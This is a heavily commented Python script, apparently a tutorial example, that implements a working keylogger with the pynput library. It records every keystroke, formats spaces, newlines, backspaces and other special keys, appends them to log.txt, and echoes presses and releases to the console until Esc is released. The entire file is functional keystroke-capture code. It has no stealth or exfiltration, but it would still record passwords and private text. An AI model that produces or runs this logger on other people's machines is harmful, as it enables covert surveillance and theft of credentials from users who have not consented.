# Import necessary modules from the pynput library
# The pynput library allows monitoring and controlling input devices
from pynput.keyboard import Key, Listener

# Initialize an empty list to store the keys that are pressed
keys = []

# Define a function that will be triggered when a key is pressed
def on_press(key):
    # Append the pressed key to the keys list
    keys.append(key)
    
    # Write the current key(s) to the log file
    write_file(keys)
    
    # Try to print the key that was pressed (if it is alphanumeric)
    try:
        print('Alphanumeric key {0} pressed'.format(key.char))
    # Handle special keys (e.g., Shift, Ctrl, etc.) which do not have a 'char' attribute
    except AttributeError:
        print('Special key {0} pressed'.format(key))
     
# Define a function to write the pressed keys to a file
def write_file(keys):
    # Open (or create) the log file in append mode
    with open('log.txt', 'a') as f:
        # Iterate through all the keys in the list
        for key in keys:
            # Convert the key object to a string and remove extra quotes
            k = str(key).replace("'", "")
            # If the key is a standard character (not a special key), write it as-is
            if k.find("Key") == -1:
                f.write(k)
            else:
                # Handle special keys with more readable formatting
                if k == "Key.space":
                    f.write(" ")  # Write a space for the space key
                elif k == "Key.enter":
                    f.write("\n")  # Write a newline for the enter key
                elif k == "Key.backspace":
                    f.write("<BACKSPACE>")  # Indicate a backspace
                else:
                    f.write(f"({k})")  # Write other special keys with parentheses
        # Clear the keys list after writing to prevent duplicate entries
        keys.clear()

# Define a function that will be triggered when a key is released
def on_release(key):
    # Print the released key
    print('{0} released'.format(key))
    # Stop the listener if the 'Esc' key is released
    if key == Key.esc:
        return False  # Returning False stops the listener

# Set up a listener to monitor keypresses and key releases
# Specify the functions to be called on keypress and key release events
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start the listener and wait for it to complete
